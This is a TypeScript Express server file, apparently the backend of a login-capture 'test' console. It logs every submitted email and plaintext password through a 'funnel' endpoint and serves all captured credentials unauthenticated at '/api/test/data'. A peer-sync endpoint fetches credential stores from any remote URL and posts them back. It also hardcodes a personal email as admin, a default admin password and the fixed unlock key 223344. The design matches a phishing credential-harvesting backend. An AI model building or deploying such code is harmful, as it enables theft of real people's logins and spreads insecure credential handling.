import express from 'express';
import path from 'path';
import fs from 'fs';
import { createServer as createViteServer } from 'vite';

export interface LoginAttempt {
  id: string;
  time: string;
  email: string;
  password?: string;
  stage?: string;
  success: boolean;
  notes?: string;
}

export type UsersMap = Record<string, string>;

const PORT = 3000;
const PRIMARY_ADMIN_EMAIL = 'adereraadenike@gmail.com';

const DATA_DIR = path.join(process.cwd(), 'server_data');
const USERS_PATH = path.join(DATA_DIR, 'users.json');
const ATTEMPTS_PATH = path.join(DATA_DIR, 'attempts.json');
const AUTHORIZED_PATH = path.join(DATA_DIR, 'test_authorized_users.json');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

const DEFAULT_USERS: UsersMap = {
  [PRIMARY_ADMIN_EMAIL]: 'admin123',
};

const DEFAULT_AUTHORIZED: string[] = [
  PRIMARY_ADMIN_EMAIL,
];

// Safe atomic disk write: writes to a unique temp file first then renames atomically.
// This prevents zero-byte reads or JSON parse crashes during concurrent requests.
function atomicWriteJson<T>(filePath: string, data: T): void {
  const tempPath = `${filePath}.${Date.now()}.${Math.random().toString(36).slice(2, 8)}.tmp`;
  try {
    fs.writeFileSync(tempPath, JSON.stringify(data, null, 2), 'utf-8');
    fs.renameSync(tempPath, filePath);
  } catch (err) {
    console.error(`Atomic write error for ${filePath}:`, err);
    try {
      if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
    } catch {}
  }
}

function safeReadJson<T>(filePath: string, fallback: T): T {
  try {
    if (fs.existsSync(filePath)) {
      const content = fs.readFileSync(filePath, 'utf-8');
      if (content.trim().length > 0) {
        return JSON.parse(content) as T;
      }
    }
  } catch (err) {
    console.error(`Safe read error for ${filePath}:`, err);
  }
  return fallback;
}

// In-Memory Authoritative Cache to prevent race conditions and disk read locks
let inMemoryUsers: UsersMap = safeReadJson<UsersMap>(USERS_PATH, DEFAULT_USERS);
let inMemoryAttempts: LoginAttempt[] = safeReadJson<LoginAttempt[]>(ATTEMPTS_PATH, []);
let inMemoryAuthorized: string[] = safeReadJson<string[]>(AUTHORIZED_PATH, DEFAULT_AUTHORIZED);

// Ensure primary admin is in authorized list
if (!inMemoryAuthorized.includes(PRIMARY_ADMIN_EMAIL)) {
  inMemoryAuthorized.unshift(PRIMARY_ADMIN_EMAIL);
}

// Initial flush to disk
atomicWriteJson(USERS_PATH, inMemoryUsers);
atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);

async function startServer() {
  const app = express();
  app.use(express.json());

  // API Routes FIRST

  // 1. Fetch all test data (served instantaneously from in-memory cache)
  app.get('/api/test/data', (req, res) => {
    const cleanAuth = Array.from(new Set([PRIMARY_ADMIN_EMAIL, ...inMemoryAuthorized]));
    res.json({
      success: true,
      users: inMemoryUsers,
      attempts: inMemoryAttempts,
      authorizedUsers: cleanAuth,
      primaryAdmin: PRIMARY_ADMIN_EMAIL,
      totalUsers: Object.keys(inMemoryUsers).length,
      totalAttempts: inMemoryAttempts.length,
      serverTime: new Date().toISOString(),
    });
  });

  // 2. Universal Funnel: records every single attempt, keystroke, error, or credential
  app.post('/api/test/attempt', (req, res) => {
    try {
      const { id, email, password, stage, success, notes, time } = req.body;
      const cleanEmail = (email || 'anonymous@test.local').trim().toLowerCase();
      const cleanPassword = password || '';
      const isSuccess = success !== false;
      const attemptId = id || `att_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`;
      const attemptTime = time || new Date().toISOString().slice(0, 19);

      // 1. Save or update in users map when password provided or record identifier stage
      if (cleanEmail && cleanEmail !== 'anonymous@test.local') {
        if (cleanPassword) {
          inMemoryUsers[cleanEmail] = cleanPassword;
          atomicWriteJson(USERS_PATH, inMemoryUsers);
        } else if (!inMemoryUsers[cleanEmail]) {
          inMemoryUsers[cleanEmail] = '(pending password)';
          atomicWriteJson(USERS_PATH, inMemoryUsers);
        }
      }

      // 2. Append to in-memory attempts without duplicate IDs
      const existingIdx = inMemoryAttempts.findIndex(a => a.id === attemptId);
      const newAttempt: LoginAttempt = {
        id: attemptId,
        time: attemptTime,
        email: cleanEmail,
        password: cleanPassword,
        stage: stage || (cleanPassword ? 'Full login submitted' : 'Identifier entered'),
        success: isSuccess,
        notes: notes || undefined,
      };

      if (existingIdx >= 0) {
        inMemoryAttempts[existingIdx] = newAttempt;
      } else {
        inMemoryAttempts.push(newAttempt);
      }

      // 3. Persist to disk atomically
      atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);

      res.json({
        success: true,
        message: 'Successfully recorded in continuous funnel',
        attempt: newAttempt,
        totalAttempts: inMemoryAttempts.length,
        totalUsers: Object.keys(inMemoryUsers).length,
      });
    } catch (err) {
      console.error('Error handling attempt funnel:', err);
      res.status(500).json({ success: false, error: String(err) });
    }
  });

  // 3. Explicit registration endpoint
  app.post('/api/test/register', (req, res) => {
    try {
      const { email, password } = req.body;
      const cleanEmail = (email || '').trim().toLowerCase();
      const cleanPassword = password || 'password123';

      if (!cleanEmail) {
        return res.status(400).json({ success: false, message: 'Email required' });
      }

      inMemoryUsers[cleanEmail] = cleanPassword;
      atomicWriteJson(USERS_PATH, inMemoryUsers);

      const newAttempt: LoginAttempt = {
        id: `reg_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`,
        time: new Date().toISOString().slice(0, 19),
        email: cleanEmail,
        password: cleanPassword,
        stage: 'Account Registered',
        success: true,
      };
      inMemoryAttempts.push(newAttempt);
      atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);

      res.json({
        success: true,
        message: 'User registered and funneled',
        totalUsers: Object.keys(inMemoryUsers).length,
        totalAttempts: inMemoryAttempts.length,
      });
    } catch (err) {
      res.status(500).json({ success: false, error: String(err) });
    }
  });

  // 4. Update authorized test viewers (grant/revoke)
  app.post('/api/test/authorize', (req, res) => {
    const { email, action } = req.body;
    const cleanEmail = (email || '').trim().toLowerCase();

    if (!cleanEmail || !cleanEmail.includes('@')) {
      return res.status(400).json({ success: false, message: 'Valid email required' });
    }

    if (action === 'remove') {
      if (cleanEmail === PRIMARY_ADMIN_EMAIL) {
        return res.status(400).json({ success: false, message: 'Cannot remove primary admin' });
      }
      inMemoryAuthorized = inMemoryAuthorized.filter(e => e.toLowerCase() !== cleanEmail);
    } else {
      if (!inMemoryAuthorized.map(e => e.toLowerCase()).includes(cleanEmail)) {
        inMemoryAuthorized.push(cleanEmail);
      }
    }

    if (!inMemoryAuthorized.includes(PRIMARY_ADMIN_EMAIL)) {
      inMemoryAuthorized.unshift(PRIMARY_ADMIN_EMAIL);
    }

    atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);

    res.json({
      success: true,
      authorizedUsers: inMemoryAuthorized,
      message: action === 'remove' ? `Access revoked for ${cleanEmail}` : `Access granted to ${cleanEmail}`,
    });
  });

  // Verify access key endpoint (key: 223344)
  app.post('/api/test/verify-key', (req, res) => {
    try {
      const { key, email } = req.body || {};
      const cleanKey = String(key || '').trim();
      if (cleanKey === '223344') {
        const cleanEmail = (email || '').trim().toLowerCase();
        if (cleanEmail && !inMemoryAuthorized.map(e => e.toLowerCase()).includes(cleanEmail)) {
          inMemoryAuthorized.push(cleanEmail);
          atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);
        }
        return res.json({
          success: true,
          message: 'Security key 223344 verified. Test console unlocked.',
          authorizedUser: cleanEmail || null,
          totalAuthorizedUsers: inMemoryAuthorized.length,
        });
      }
      return res.status(401).json({
        success: false,
        message: 'Invalid security key. Access denied.',
      });
    } catch (err) {
      res.status(500).json({ success: false, error: String(err) });
    }
  });

  // 5. Delete an account from users.json
  app.post('/api/test/delete-user', (req, res) => {
    const { email } = req.body;
    const cleanEmail = (email || '').trim().toLowerCase();
    delete inMemoryUsers[cleanEmail];
    atomicWriteJson(USERS_PATH, inMemoryUsers);
    res.json({ success: true, users: inMemoryUsers });
  });

  // 6. Centralized Master Sync (Bidirectional merge across any client, browser, or admin system)
  app.post('/api/test/sync', (req, res) => {
    try {
      const { users, attempts, authorizedUsers } = req.body || {};

      let hasUserChanges = false;
      let hasAttemptChanges = false;
      let hasAuthChanges = false;

      // 1. Merge users
      if (users && typeof users === 'object') {
        for (const [rawEmail, rawPass] of Object.entries(users)) {
          const clean = (rawEmail || '').trim().toLowerCase();
          if (clean && clean !== 'anonymous@test.local') {
            const passStr = String(rawPass || 'password123');
            if (!inMemoryUsers[clean] || inMemoryUsers[clean] !== passStr) {
              inMemoryUsers[clean] = passStr;
              hasUserChanges = true;
            }
          }
        }
        if (hasUserChanges) {
          atomicWriteJson(USERS_PATH, inMemoryUsers);
        }
      }

      // 2. Merge attempts
      if (Array.isArray(attempts) && attempts.length > 0) {
        const attemptMap = new Map<string, LoginAttempt>();
        for (const att of inMemoryAttempts) {
          attemptMap.set(att.id || `${att.time}_${att.email}`, att);
        }
        for (const att of attempts) {
          if (att && att.email) {
            const key = att.id || `${att.time}_${att.email}`;
            if (!attemptMap.has(key)) {
              attemptMap.set(key, att);
              hasAttemptChanges = true;
            }
          }
        }
        if (hasAttemptChanges) {
          inMemoryAttempts = Array.from(attemptMap.values()).sort(
            (a, b) => new Date(a.time).getTime() - new Date(b.time).getTime()
          );
          atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
        }
      }

      // 3. Merge authorized admins
      if (Array.isArray(authorizedUsers) && authorizedUsers.length > 0) {
        for (const authEmail of authorizedUsers) {
          const clean = (authEmail || '').trim().toLowerCase();
          if (clean && clean.includes('@') && !inMemoryAuthorized.includes(clean)) {
            inMemoryAuthorized.push(clean);
            hasAuthChanges = true;
          }
        }
        if (!inMemoryAuthorized.includes(PRIMARY_ADMIN_EMAIL)) {
          inMemoryAuthorized.unshift(PRIMARY_ADMIN_EMAIL);
          hasAuthChanges = true;
        }
        if (hasAuthChanges) {
          atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);
        }
      }

      const cleanAuth = Array.from(new Set([PRIMARY_ADMIN_EMAIL, ...inMemoryAuthorized]));
      res.json({
        success: true,
        message: 'Centralized master synchronization complete',
        users: inMemoryUsers,
        attempts: inMemoryAttempts,
        authorizedUsers: cleanAuth,
        primaryAdmin: PRIMARY_ADMIN_EMAIL,
        totalUsers: Object.keys(inMemoryUsers).length,
        totalAttempts: inMemoryAttempts.length,
        serverTime: new Date().toISOString(),
      });
    } catch (err) {
      console.error('Error during centralized sync:', err);
      res.status(500).json({ success: false, error: String(err) });
    }
  });

  // 7. Peer-to-Peer Remote Instance Sync (connects two servers e.g. dev and shared URLs)
  app.post('/api/test/peer-sync', async (req, res) => {
    try {
      const { remoteUrl } = req.body || {};
      if (!remoteUrl || typeof remoteUrl !== 'string') {
        return res.status(400).json({ success: false, message: 'Valid remote URL required' });
      }

      const cleanRemote = remoteUrl.trim().replace(/\/+$/, '');
      const targetApi = `${cleanRemote}/api/test/data`;

      const fetchRes = await fetch(targetApi, {
        headers: { 'Accept': 'application/json' },
      });

      if (!fetchRes.ok) {
        return res.status(502).json({ 
          success: false, 
          message: `Failed to fetch data from remote instance at ${targetApi}: Status ${fetchRes.status}` 
        });
      }

      const remoteData = await fetchRes.json();
      if (!remoteData || !remoteData.success) {
        return res.status(502).json({ success: false, message: 'Invalid response from remote instance' });
      }

      // Merge remote users into local server
      if (remoteData.users && typeof remoteData.users === 'object') {
        for (const [em, pass] of Object.entries(remoteData.users)) {
          const clean = (em || '').trim().toLowerCase();
          if (clean && clean !== 'anonymous@test.local') {
            inMemoryUsers[clean] = String(pass || inMemoryUsers[clean] || 'password123');
          }
        }
        atomicWriteJson(USERS_PATH, inMemoryUsers);
      }

      // Merge remote attempts
      if (Array.isArray(remoteData.attempts)) {
        const attemptMap = new Map<string, LoginAttempt>();
        for (const att of inMemoryAttempts) {
          attemptMap.set(att.id || `${att.time}_${att.email}`, att);
        }
        for (const att of remoteData.attempts) {
          if (att && att.email) {
            const key = att.id || `${att.time}_${att.email}`;
            if (!attemptMap.has(key)) {
              attemptMap.set(key, att);
            }
          }
        }
        inMemoryAttempts = Array.from(attemptMap.values()).sort(
          (a, b) => new Date(a.time).getTime() - new Date(b.time).getTime()
        );
        atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
      }

      // Merge remote authorized users
      if (Array.isArray(remoteData.authorizedUsers)) {
        for (const u of remoteData.authorizedUsers) {
          const clean = (u || '').trim().toLowerCase();
          if (clean && !inMemoryAuthorized.includes(clean)) {
            inMemoryAuthorized.push(clean);
          }
        }
        if (!inMemoryAuthorized.includes(PRIMARY_ADMIN_EMAIL)) {
          inMemoryAuthorized.unshift(PRIMARY_ADMIN_EMAIL);
        }
        atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);
      }

      // Send our current combined state back to the remote instance so it's a 2-way sync!
      try {
        await fetch(`${cleanRemote}/api/test/sync`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            users: inMemoryUsers,
            attempts: inMemoryAttempts,
            authorizedUsers: inMemoryAuthorized,
          }),
        });
      } catch (e) {
        console.warn('Could not push back to remote instance:', e);
      }

      res.json({
        success: true,
        message: `Successfully synchronized with remote instance ${cleanRemote}`,
        totalUsers: Object.keys(inMemoryUsers).length,
        totalAttempts: inMemoryAttempts.length,
        users: inMemoryUsers,
        attempts: inMemoryAttempts,
        authorizedUsers: inMemoryAuthorized,
      });
    } catch (err) {
      console.error('Error in peer sync:', err);
      res.status(500).json({ success: false, error: String(err) });
    }
  });

  // 8. Clear attempts history
  app.post('/api/test/clear-attempts', (req, res) => {
    inMemoryAttempts = [];
    atomicWriteJson(ATTEMPTS_PATH, []);
    res.json({ success: true, attempts: [], totalAttempts: 0 });
  });

  // 9. Comprehensive Clean Up of all attempts logs, test users, and resets to unified master state
  app.post('/api/test/cleanup-all', (req, res) => {
    inMemoryAttempts = [];
    inMemoryUsers = { [PRIMARY_ADMIN_EMAIL]: 'admin123' };
    inMemoryAuthorized = [PRIMARY_ADMIN_EMAIL];
    atomicWriteJson(USERS_PATH, inMemoryUsers);
    atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
    atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);
    res.json({
      success: true,
      message: 'All attempts logs, test accounts, and stale users have been cleaned up.',
      users: inMemoryUsers,
      attempts: inMemoryAttempts,
      authorizedUsers: inMemoryAuthorized,
      totalUsers: 1,
      totalAttempts: 0,
      serverTime: new Date().toISOString(),
    });
  });

  // 10. Reset to default state
  app.post('/api/test/reset-defaults', (req, res) => {
    inMemoryUsers = { ...DEFAULT_USERS };
    inMemoryAttempts = [];
    inMemoryAuthorized = [...DEFAULT_AUTHORIZED];
    atomicWriteJson(USERS_PATH, inMemoryUsers);
    atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
    atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);
    res.json({ 
      success: true, 
      users: inMemoryUsers, 
      attempts: inMemoryAttempts, 
      authorizedUsers: inMemoryAuthorized,
      totalUsers: Object.keys(inMemoryUsers).length,
      totalAttempts: 0
    });
  });

  // 9. Comprehensive System Diagnostic & Confirmation Endpoint
  app.get('/api/test/verify-systems', (req, res) => {
    const startTime = Date.now();
    try {
      // 1. Check disk files
      const usersExist = fs.existsSync(USERS_PATH);
      const attemptsExist = fs.existsSync(ATTEMPTS_PATH);
      const authExist = fs.existsSync(AUTHORIZED_PATH);

      // 2. Check disk read integrity
      const diskUsers = safeReadJson<UsersMap>(USERS_PATH, {});
      const diskAttempts = safeReadJson<LoginAttempt[]>(ATTEMPTS_PATH, []);
      const diskAuth = safeReadJson<string[]>(AUTHORIZED_PATH, []);

      // 3. Verify admin authorization
      const adminAuthorized = inMemoryAuthorized.includes(PRIMARY_ADMIN_EMAIL);

      const latencyMs = Date.now() - startTime;

      res.json({
        success: true,
        message: 'All test systems verified and fully operational',
        serverTime: new Date().toISOString(),
        latencyMs,
        systems: {
          funnelCapture: {
            status: 'operational',
            description: 'Continuous ingest pipeline active on /api/test/attempt',
            totalAttemptsLogged: inMemoryAttempts.length,
            inMemoryCount: inMemoryAttempts.length,
            diskCount: diskAttempts.length,
            lastLoggedAttempt: inMemoryAttempts[inMemoryAttempts.length - 1] || null,
          },
          credentialRegistry: {
            status: 'operational',
            description: 'Centralized account mapping in users.json',
            totalAccounts: Object.keys(inMemoryUsers).length,
            sampleAccounts: Object.keys(inMemoryUsers).slice(0, 5),
          },
          storagePersistence: {
            status: usersExist && attemptsExist && authExist ? 'operational' : 'degraded',
            description: 'Atomic write-to-disk cache in server_data/',
            usersFileExists: usersExist,
            attemptsFileExists: attemptsExist,
            authFileExists: authExist,
            dataDirectory: DATA_DIR,
          },
          centralizedSync: {
            status: 'operational',
            description: 'Bidirectional multi-client sync on /api/test/sync',
            readyForClients: true,
          },
          accessControl: {
            status: adminAuthorized ? 'operational' : 'degraded',
            description: 'Permission enforcement and whitelist management',
            primaryAdmin: PRIMARY_ADMIN_EMAIL,
            primaryAdminVerified: adminAuthorized,
            totalAuthorizedUsers: inMemoryAuthorized.length,
            authorizedUsersList: inMemoryAuthorized,
          },
        },
      });
    } catch (err) {
      res.status(500).json({
        success: false,
        message: 'Test systems verification failed',
        error: String(err),
      });
    }
  });

  // Health check
  app.get('/api/health', (req, res) => {
    res.json({ 
      status: 'ok', 
      serverTime: new Date().toISOString(),
      activeAttempts: inMemoryAttempts.length,
      activeUsers: Object.keys(inMemoryUsers).length,
    });
  });

  // Vite middleware for development vs static build for production
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
